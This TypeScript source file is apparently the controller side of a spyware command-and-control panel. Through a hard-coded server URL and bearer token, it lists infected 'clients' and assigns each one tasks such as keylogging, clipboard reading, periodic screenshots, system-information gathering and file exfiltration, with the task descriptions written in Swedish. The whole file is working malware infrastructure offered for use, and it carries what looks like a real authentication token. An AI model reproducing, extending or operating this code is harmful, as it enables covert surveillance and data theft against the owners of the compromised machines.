
import { INSTRUCTION_CODE } from './scriptData';

// Interface definitions
export interface ScriptsData {
  [key: string]: string;
}

export interface InstructionType {
  id: string;
  name: string;
  description: string;
  code: string;
}

export interface ClientInstruction {
  id: string;
  name: string;
  system: string;
  currentInstruction: string;
  lastActivity: string;
}

// More descriptive instruction descriptions
const INSTRUCTION_DESCRIPTIONS: Record<string, string> = {
  "standard": "Standardinstruktion för klippbordsavläsning",
  "keylogger": "Registrerar tangentbordstryckningar",
  "screenshot": "Tar skärmdumpar periodiskt",
  "system_info": "Samlar in systeminformation",
  "file_exfiltration": "Söker och skickar specifika filer"
};

// Server configuration - Configured to match the WSGI/Apache setup
const SERVER_BASE_URL = 'https://neea.fun';
// API Endpoints based on the WSGI server structure in Apache config
const API_CLIENTS_ENDPOINT = '/api/clients';
const API_CLIENT_INSTRUCTION_ENDPOINT = '/api/clients/{clientId}/instruction';
const API_CONFIG_ENDPOINT = '/api/get_config';
const API_INSTRUCTIONS_ENDPOINT = '/api/instructions';

// Authentication token - This should match what is expected by your server
const AUTH_TOKEN = 'SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==';

// Extract scripts from instructions.py
export async function extractScriptsFromInstructionsPy(): Promise<ScriptsData> {
  // This function is a fallback when API calls fail
  try {
    console.log("Using local instruction code from scriptData.ts");
    return INSTRUCTION_CODE;
  } catch (error) {
    console.error("Error extracting scripts:", error);
    return {
      "standard": "# Standard instruktioner - logga tangenttryckningar",
      "keylogger": "# Instruktion: Keylogger-läge",
      "screenshot": "# Instruktion: Screenshot-läge",
      "system_info": "# Instruktion: System Info-läge",
      "file_exfiltration": "# Instruktion: File Exfiltration-läge",
    };
  }
}

/**
 * Get scripts data from API
 * @returns {Promise<ScriptsData>} The scripts data
 */
export async function getScripts(): Promise<ScriptsData> {
  try {
    console.log("Fetching instructions from API:", `${SERVER_BASE_URL}${API_INSTRUCTIONS_ENDPOINT}`);
    
    // Use the correct API endpoint with proper authorization
    const response = await fetch(`${SERVER_BASE_URL}${API_INSTRUCTIONS_ENDPOINT}`, {
      headers: {
        'Authorization': `Bearer ${AUTH_TOKEN}`,
        'Accept': 'application/json'
      }
    });
    
    if (!response.ok) {
      console.warn(`Failed to fetch scripts: ${response.status} ${response.statusText}`);
      throw new Error(`Failed to fetch scripts: ${response.status} ${response.statusText}`);
    }
    
    try {
      const data = await response.json();
      console.log("Successfully fetched instruction data:", data);
      return data;
    } catch (error) {
      console.warn("API returned non-JSON response, falling back to local data");
      throw new Error("API returned non-JSON response");
    }
  } catch (error) {
    console.error("Error fetching scripts, using fallback data:", error);
    
    // Fallback to local instruction code
    return extractScriptsFromInstructionsPy();
  }
}

// Get all available instruction types
export async function getInstructionTypes(): Promise<InstructionType[]> {
  try {
    // First try to get from API
    const scripts = await getScripts();
    
    return Object.keys(scripts).map(key => ({
      id: key,
      name: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
      description: INSTRUCTION_DESCRIPTIONS[key] || key,
      code: scripts[key]
    }));
  } catch (error) {
    console.error("Error getting instruction types:", error);
    // Fallback to local data
    const fallbackScripts = await extractScriptsFromInstructionsPy();
    
    return Object.keys(fallbackScripts).map(key => ({
      id: key,
      name: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
      description: INSTRUCTION_DESCRIPTIONS[key] || key,
      code: fallbackScripts[key]
    }));
  }
}

// Get all clients and their current instructions
export async function getClients(): Promise<ClientInstruction[]> {
  try {
    console.log("Fetching clients from API:", `${SERVER_BASE_URL}${API_CLIENTS_ENDPOINT}`);
    
    // Use the correct API endpoint from the WSGI server
    const response = await fetch(`${SERVER_BASE_URL}${API_CLIENTS_ENDPOINT}`, {
      headers: {
        'Authorization': `Bearer ${AUTH_TOKEN}`,
        'Accept': 'application/json'
      }
    });
    
    if (!response.ok) {
      console.warn(`HTTP error! status: ${response.status}`);
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const data = await response.json();
    console.log("Successfully fetched client data:", data);
    return data;
  } catch (error) {
    console.error("Error fetching clients:", error);
    // Return empty array rather than mock data
    return [];
  }
}

// Update a client's instruction
export async function updateClientInstruction(clientId: string, instructionId: string): Promise<boolean> {
  try {
    console.log(`Updating client ${clientId} with instruction ${instructionId}`);
    
    // Use the correct API endpoint with proper path parameter replacement
    const endpoint = API_CLIENT_INSTRUCTION_ENDPOINT.replace('{clientId}', clientId);
    const response = await fetch(`${SERVER_BASE_URL}${endpoint}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${AUTH_TOKEN}`,
        'Accept': 'application/json'
      },
      body: JSON.stringify({ instruction: instructionId }),
    });
    
    if (!response.ok) {
      console.warn(`HTTP error! status: ${response.status}`);
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    console.log("Successfully updated client instruction");
    return true;
  } catch (error) {
    console.error("Error updating client instruction:", error);
    return false;
  }
}

// Get server configuration
export async function getServerConfig() {
  try {
    console.log("Fetching server config from API:", `${SERVER_BASE_URL}${API_CONFIG_ENDPOINT}`);
    
    const response = await fetch(`${SERVER_BASE_URL}${API_CONFIG_ENDPOINT}`, {
      headers: {
        'Authorization': `Bearer ${AUTH_TOKEN}`,
        'Accept': 'application/json'
      }
    });
    
    if (!response.ok) {
      console.warn(`HTTP error! status: ${response.status}`);
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const data = await response.json();
    console.log("Successfully fetched server config:", data);
    return data;
  } catch (error) {
    console.error("Error fetching server config:", error);
    // Return null instead of mock data
    return null;
  }
}
